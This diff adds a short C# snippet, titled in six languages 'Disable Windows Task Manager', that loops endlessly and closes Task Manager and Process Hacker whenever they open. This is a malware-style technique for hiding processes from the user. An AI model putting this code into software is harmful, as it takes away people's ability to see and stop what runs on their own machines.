@@ -1,0 +1,28 @@
+[FR] Désactiver le gestionnaire des tâches windows 7,8,10
+[ENG] Disable Windows Task Manager 7,8,10
+[SPA] Deshabilitar el administrador de tareas de windows 7,8,10
+[ITA] Disabilita Task Manager di Windows 7,8,10
+[DE] Deaktivieren des Task-Managers Windows 7,8,10
+[RU] Отключить диспетчер задач Windows 7,8,10
+
+*****************************************************************
+
+
+using System.Diagnostics;
+
+
+bool loop = true;
+ 
+while (loop)
+{
+Process[] task = Process.GetProcessesByName("taskmgr");
+Process[] ms = Process.GetProcessesByName("ProcessHacker");
+if (task.Length == 1)
+{
+task[0].CloseMainWindow();
+}
+if ( ms.Length == 1)
+{
+ms[0].CloseMainWindow();
+}
+}
